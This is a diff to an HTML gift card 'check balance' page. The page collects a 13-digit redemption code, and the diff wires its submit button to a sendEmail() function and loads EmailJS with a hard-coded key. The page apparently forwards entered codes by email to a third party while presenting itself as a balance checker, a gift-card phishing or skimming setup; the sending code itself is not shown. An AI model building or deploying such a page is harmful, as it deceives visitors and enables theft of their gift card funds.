@@ -24,11 +24,21 @@
           <label for="enter-code"> Enter your 13 digits redemption code <span class="enter-code-span"> * </span> </label>
           <input type="text" placeholder="XXX-XXX-XXX-XXXX" id="enter-code" required>
           <span id="aria"></span>
-          <button id="submit" type="submit"> Check balance</button>
+          <button onclick="sendEmail();" id="submit" type="submit"> Check balance</button>
         </form>
     </div>
     <p> Your gift card balance never expires and is non-transferrable after first use. Read the full  <span class="p-span">terms and conditions. </span>  </p>    
-<script src="https://smtpjs.com/v3/smtp.js"></script>
+
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init("IRrwgS16N1M7w_7t9");
+   })();
+</script>
+
 <script src="index.js"></script>
+
 </body>
 </html>
